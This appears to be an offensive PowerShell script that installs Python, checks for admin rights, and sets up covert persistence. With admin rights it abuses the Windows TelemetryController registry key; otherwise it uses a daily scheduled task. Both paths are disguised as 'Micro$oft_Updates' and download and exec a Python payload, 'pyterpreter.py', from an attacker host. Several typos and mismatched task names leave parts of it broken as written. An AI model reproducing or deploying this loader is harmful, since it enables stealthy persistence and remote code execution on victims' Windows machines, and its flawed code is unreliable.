Invoke-webrequest -URI $URL -outfile C:\python.msix
add-appxpackage -path C:\python.msix
python -m pip install requests
$admins = Get-LocalGroupMember -Group administrators
$curent_user = "$env:UserDomain\$env:Username"
$admin = 0
foreach($user in $admins){
    if($user -like $curent_user){$admin = 1}
}
if ($admin -eq 1){
    New-Item -path 'HKLM:\SOFTWARE\Microsoft\Windows\NT\CurrentVersion\AppCompatFlags\TelemetryCtonroller' -Name 'Micro$oft_Updates' 
    New-ItemProperty -path 'HKLM:\SOFTWARE\Microsoft\Windows\NT\CurrentVersion\AppCompatFlags\TelemetryCtonroller\Micro$oft_Updates' -Name 'Command' -Value "python -c `"import requests; r = requests.get('http://$IP:$PORT/pyterpreter.py'); exec(r.text)`"" -PropertyType "String"
    New-ItemProperty -path 'HKLM:\SOFTWARE\Microsoft\Windows\NT\CurrentVersion\AppCompatFlags\TelemetryCtonroller\Micro$oft_Updates' -Name 'Nightly' -Value "1" -PropertyType "Dword"
    Start-ScheduledTask -path 'Micorosft\Windows\Application Experience\Microsoft compatibility Appraiser'
}

elseif($admin -eq 0){
    $trig = New-ScheduledTaskTrigger -daily
    New-ScheduledTask -AsJob -Action "python -c python -c `"import requests; r = requests.get('http://$IP:$PORT/pyterpreter.py'); exec(r.text)`"" -Trigger $trig -Name "Micro`$oft_updates"
    Start-ScheduledTask -Name 'Micro`$soft_updates'
}
